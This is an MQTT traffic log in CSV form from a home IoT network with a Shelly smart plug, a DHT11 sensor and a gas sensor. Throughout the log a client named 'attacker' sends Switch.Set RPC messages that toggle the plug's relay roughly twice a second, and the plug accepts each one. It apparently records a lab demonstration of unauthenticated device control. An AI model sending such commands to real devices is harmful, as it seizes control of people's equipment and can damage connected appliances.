2026-04-22T16:39:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5398 34499.091 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:26,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:26,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34499.09,""swi"
2026-04-22T16:39:26,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5399 34499.110 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:26,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:26,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5400 34499.591 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:26,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:26,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34499.59,""swi"
2026-04-22T16:39:26,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5401 34499.608 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:39:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:39:26,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:39:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:39:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:39:27,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:27,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5402 34500.095 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:27,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:27,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34500.09,""swi"
2026-04-22T16:39:27,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5403 34500.114 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:27,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:27,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5404 34500.592 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:27,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:27,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34500.59,""swi"
2026-04-22T16:39:27,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5405 34500.609 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:28,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:28,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5406 34501.093 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:28,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:28,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34501.09,""swi"
2026-04-22T16:39:28,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5407 34501.112 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:28,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:28,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5408 34501.594 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:28,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:28,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34501.59,""swi"
2026-04-22T16:39:28,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5409 34501.611 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:29,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:29,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5410 34502.094 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:29,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:29,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34502.09,""swi"
2026-04-22T16:39:29,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5411 34502.113 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:29,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:29,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5412 34502.595 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:29,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:29,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34502.59,""swi"
2026-04-22T16:39:29,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5413 34502.612 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:30,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:30,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5414 34503.096 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:30,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:30,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34503.09,""swi"
2026-04-22T16:39:30,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5415 34503.114 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:30,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:30,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:30,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5416 34503.611 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:30,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5417 34503.611 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:30,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34503.59,""swi"
2026-04-22T16:39:31,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:31,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5418 34504.097 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:31,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:31,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34504.09,""swi"
2026-04-22T16:39:31,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5419 34504.115 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:31,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:31,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5420 34504.602 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:31,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:31,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34504.60,""swi"
2026-04-22T16:39:31,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5421 34504.619 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:32,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:32,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5422 34505.097 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:32,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:32,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34505.09,""swi"
2026-04-22T16:39:32,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5423 34505.116 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:32,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:32,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5424 34505.599 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:32,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:32,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34505.59,""swi"
2026-04-22T16:39:32,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5425 34505.615 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:33,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:33,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5426 34506.099 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:33,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:33,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34506.10,""swi"
2026-04-22T16:39:33,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5427 34506.117 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:33,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:33,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5428 34506.601 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:33,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:33,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34506.60,""swi"
2026-04-22T16:39:33,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5429 34506.618 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5430 34507.100 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34507.10,""swi"
2026-04-22T16:39:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5431 34507.119 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:34,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5432 34507.601 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34507.60,""swi"
2026-04-22T16:39:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5433 34507.617 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5434 34508.101 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34508.10,""swi"
2026-04-22T16:39:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5435 34508.120 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5436 34508.602 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34508.60,""swi"
2026-04-22T16:39:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5437 34508.619 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5438 34509.106 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34509.10,""swi"
2026-04-22T16:39:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5439 34509.125 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:36,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:36,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5440 34509.606 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:36,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:36,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34509.60,""swi"
2026-04-22T16:39:36,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5441 34509.624 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:39:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:39:36,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:39:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:39:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:39:37,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:37,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5442 34510.110 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:37,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:37,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34510.11,""swi"
2026-04-22T16:39:37,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5443 34510.129 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:37,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:37,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5444 34510.615 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:37,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:37,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34510.61,""swi"
2026-04-22T16:39:37,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5445 34510.632 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:38,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:38,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5446 34511.116 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:38,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34511.11,""swi"
2026-04-22T16:39:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5447 34511.134 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:38,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:38,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5448 34511.619 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:38,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:38,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34511.62,""swi"
2026-04-22T16:39:38,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5449 34511.635 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
